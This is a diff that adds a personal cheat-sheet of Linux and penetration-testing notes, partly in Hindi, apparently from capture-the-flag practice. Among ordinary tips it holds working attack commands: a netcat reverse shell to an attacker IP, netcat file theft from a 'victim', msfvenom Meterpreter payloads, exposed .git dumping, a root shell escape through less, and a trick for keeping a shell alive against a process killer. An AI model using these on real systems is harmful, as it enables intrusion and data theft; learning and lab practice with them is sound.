@@ -1,0 +1,220 @@
+\" => it will nullify the purpose of speical character " , and print it as a char only
+SYN scans are the default scans used by Nmap if run with sudo permissions. If run without sudo permissions, Nmap defaults to the TCP Connect scan we saw in the previous task.
+enabling oracle sql mode in mariadb: set sql_mode=oracle; 
+Regex for URL : https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)
+to install from go get => put this in the begining of command GO111MODULE=on go get => or you can use go install
+alternative of pip3 : python3 -m pip 
+installing of pip:
+               $ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+               $ sudo python2.7 get-pip.py
+               which pip2.7
+################################################       working with grep
+
+grep -v "OS" ### this will grep all lines , which does not contains string "OS"  , and remember this is case sensitive , means os and OS will be treated diffrently
+
+
+       
+############################################## working with .git directory 
+                         say on a webserver https://example.com , https://example.com/.git is accessible and we can see all folders then to download this .git directory=>
+                         
+                         use /opt/hackertools/GitTools , or git clone https://github.com/internetwache/GitTools.git
+                         
+                         use gitdumber.sh to download the .git directory => ./gitdumper.sh https://example.com/.git /media/boxlogin/thm/githappens/
+                         now : cd /media/boxlogin/thm/githappens/
+                         
+                               ls -lah : .git
+                         git log => will list out all commit made
+                         
+                         git log --pretty=oneline => this will print all commits with their descirption in oneline
+                         
+                         to check the commit made in a specific commmit with id d954a99b96ff11c37a558a5d93ce52d0f3702a7d:
+                         
+                          git show d954a99b96ff11c37a558a5d93ce52d0f3702a7d
+######################################################################################################################################################3
+
+
+installing from .deb :: sudo gdebi ~/discord.deb :: or you can use => sudo dpkg -i file.deb
+
+#### reading in little endian format using strings: strings -e l file_name 
+
+################# compiling c program and making i386 or 32 bit binary =>
+               gcc -g -m32 format_string_attack.c -o format_string_attack
+               
+################ compiling c program and disabling ROP protection ( PIE ) :
+              gcc -o program program.c -no-pie
+################ compiling c program and disabling buffer overflow protection (NX):
+              gcc -o program program.c -z execstack
+############### compiling c program without any protection : 
+              gcc -o program program.c -z execstack -no-pie
+
+############ running php server : > php -S IP:port app.php
+####################################################### Creating a pwning server ####################################################################
+            say we have a binary chall , and we want that whenever someone connect to, 127.0.0.1 1234 , this chall will execute to the connecter and a bidirection tcp connection is established so the chall binary can run and data can be transfered , we can do this by using socat
+            
+            => socat socat TCP-LISTEN:5760,reuseaddr,fork EXEC:"./chall"
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+###################### sharing files between two machines using SSH ##########################
+             To copy a file from B to A while logged into B:
+
+                      scp /path/to/file username@a:/path/to/destination
+             To copy a file from B to A while logged into A:
+
+                      scp username@b:/path/to/file /path/to/destination
+
+################# converting signed integer to unsigned integer 
+            in c max integer value is 2147483647 
+            suppose we want to put a number bigger than this is c program input , ex : 2152223408
+            so what we can do , we can convert this signed integer to unsigned , and generate its negative , which will lesser and will fit in 32 bit
+            
+            for that magic trick is convert the number in binary =>
+            ipython3
+            >bin(2152223408)
+            '0b10000000010010000101001010110000'
+            now consider the 1 next to most significant 1 , means in this case our binary will become 0b10010000101001010110000 , we have removed first 1 and all its following zero
+            > ( 2 ** 31) - 0b10010000101001010110000
+            2142743888
+            now instead of using 2152223408 which is bigger than range , we can use -2142743888
+            
+            method 2 :
+            ipython3
+            >bin(2152223408)[2:].replace('1','|').replace('0','1').replace('|','0') 
+            '01111111101101111010110101001111'
+            > 0b01111111101101111010110101001111 + 1
+            2142743888
+            
+            we have the same answer with this method too
+
+################################# running command with less , 
+                            suppose we can run less as a root , so what we can do , 
+                            $ less any_file_to_Read
+                            then to give command in less , do => 
+                            !whoami
+                            and it will get execute and print the result
+
+untar the file: 
+tar -xvf filename.tar
+suppose you want to search a particular string present in files and subfiles of directories/subfiles , then use this command:
+  grep -iR -A 2 'invite_code' 2>/dev/null
+ssh portforwarding => ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb => here our pub key is stored in ~/.ssh/authorized_keys of strapi user of horizontal.htb machine 
+taking screenshot with terminal of a web page => /usr/bin/google-chrome --headless --screenshot="chrome-ss1.png" "https://www.putorius.net" --no-sandbox
+creating requirements.txt for python project =>
+pipreqs /path/to/project/folder
+
+adding 2>/dev/null at last of command will not show any error on the screen
+to find a particular file at a location =>
+ 
+ 
+   find / -name file_name 2>/dev/null
+   for faster result => locate file_name => give the same result more fastly
+
+default password for ssh is => CHANGEME
+for reverse shell => sometimes firewall block all other ports and only allow specific ports => for both traffic going inside to network and traffic going outside to internet from the network => so always to listen on most common port like => 80 , 53 on attacker machine
+
+FTP : we can also access ftp via browser with this : ftp://user:heightofsecurity123!IP/.ssh/id_rsa
+
+To enable IP forwarding in linux => echo 1 > /proc/sys/net/ipv4/ip_forward
+
+// if you are not getting reverse shell then their might be possiblities firewall is on ,to disable it in linux : sudo ufw disable 
+
+searchsploit -m 34234.c                 // issse db-exploit 34234.c download ho jayega
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'    //getting interactive shell after meterpreter shell
+                same task can also done by => bash -i
+find / -type f -perm -u=s 2>/dev/null              // finding misconnfigure file in target sysem after meterpreter shell
+su username                                        // getting user privilages with the users password....
+sudo su - username                                 // switching from one user to another user with the password of our own present user...
+if we have a private rsa key (/root/.ssh/id_rsa) then we can login or get a reverse shell of any machine without any password
+say key file name is id_rsa 
+then for getting reverse shell of machine
+ssh -i id_rsa user@ip_machine
+mostly cd /var/log/apache2 ke grep -r password?email password rakhta hai
+isske saath saath agar /var/log mein audit bhi hai toh hamesha password: cd var/log/audit ya cd /var/log/audit.log >> cat * | grep 'COMM="Trace"' mein milaga
+aur info : https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details iss page par milegi
+
+payload generator for windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=lhost LPORT=lport -f aspx > shell.aspx
+msfvenom -p cmd/unix/reverse_netcat lhost=LHOST lport=LPORT R      // treat it like a command and use alongwith netcat listener
+msfvenom -p php/meterpreter_reverse_tcp lhost=LHOST lport=53 -o meterpreter.php   // generating php reverse shell
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=172.16.64.10 lport=59919 -f elf -o shell  // generating linux exutable payload
+
+// base64 decode
+echo -n string | base64 -d
+
+
+// HTTPOnly:
+if set to TRUE te cookie wiil be accessible only through the HTTP protocol (the cookie will not be accessible by scripting languages). this setting can help to reduce identity theft through XSS attacks. Default is FALSE
+
+for making script runnable from everywhere: 
+ln -sf directory_of_script_alogwith_the_script_name   /usr/bin/new_name_via_which_we_want_launch_the_script
+how to add directory to a path permanently:
+nano /etc/environment       // edit and the path
+source /etc/environment && export PATH  // run this command 
+suppose we want to display files on browser then do by: 
+file:///root/fil.txt
+
+how to mount one partition to our present partition to see its content: 
+1) go media and create a dir with partition name say sda1
+now 
+2) mount /dev/sda1 /media/sda1
+now you can see all content of /dev/sda1 in /media/sda1
+
+BURPSUIT:
+burpsuite mein script ke according encode krne ke liye ctrl+U
+
+When revrshell is got but it get died in few seconds:
+it might be possible that there is any service or job running on the system which kill every process  generated by nc for connection to any other host, in that case we have to rce for cp /bin/nc /dev/shm/new_nc   basically we will cp netcat to another location  with different name on the victim and after that the serice or job which is killing the process created by nc cant kill the processes created by /dev/shm/new_nc
+now rce /dev/shm/new_nc YOUR_IP PORT -e /bin/bash and enjoy the shell
+
+downloading files from victim machine using netcat: 
+prerequist : victim must have nc installed in it.,you must have a revrshell on victim and privilleges to run nc
+
+start a nc listener on your machine : nc -nvlp 999 > name_of_file_same_as_on_victim
+a listener will start listening for the data which will send to store in this file
+on the victim revershell : nc IP 999 < name_of_file_same_as_on_victim
+and now nc listener on attacker we will terminate and attacker will get the file name_of_file_same_as_on_victim
+
+
+// ssh reverse port forwarding :and generating a public link:
+ssh -R 80:192.168.43.224:80 ssh.localhost.run
+after this /var/www/html
+directory mein jo bhi hoga woh generated link ke through access kiya ja sakta hai, by default index.html hi run hoga 
+
+if this not work use serveo.net:
+ssh -R 80:192.168.43.224:80 serveo.net
+ssh -R vaishnavas:80:192.168.43.224:80 serveo.net
+
+// ever find ftp port open try this command for submdomain enumeration:
+openssl s_client -connect crossfit.htb:21 -starttls ftp -servername crossfit.htb
+
+
+// for extracting .ab (backups of mobile phones) : ( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 backup.ab ) |  tar xfvz -
+
+Difference Between HTTP/1.0 and HTTP/1.1:
+      in case of HTTP/1.0 after every single request, tcp connection will get close: "Connection: Close"
+      in case of HTTP/1.1 after every single request, tcp connection will remain alive: "Connection: keep-alive"
+      
+Remeber: URL mein bhi comments kiye jate hai: http://learningpoint.technohuge.com/login ko agar http://learningpoint.technohuge.com/#login krr de toh yein humein sirf aur sirf http://learningpoint.technohuge.com par redirect krega
+
+How to Create a Cron Job => 
+first check there is already any cron job or not by crontab -l => if no 
+then create by => crontab -e
+save it and it will run at your specified time
+
+Process State Codes (STAT):
+R running or runnable (on run queue)
+D uninterruptible sleep (usually IO)
+S interruptible sleep (waiting for an event to complete)
+Z defunct/zombie, terminated but not reaped by its parent
+T stopped, either by a job control signal or because it is being traced
+Some extra modifiers:
+
+< high-priority (not nice to other users)
+N low-priority (nice to other users)
+L has pages locked into memory (for real-time and custom IO)
+s is a session leader
+l is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)
++ is in the foreground process group
+
+
+reverse shell command => rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 > /tmp/f
+    and launch a nc listener at port 1234
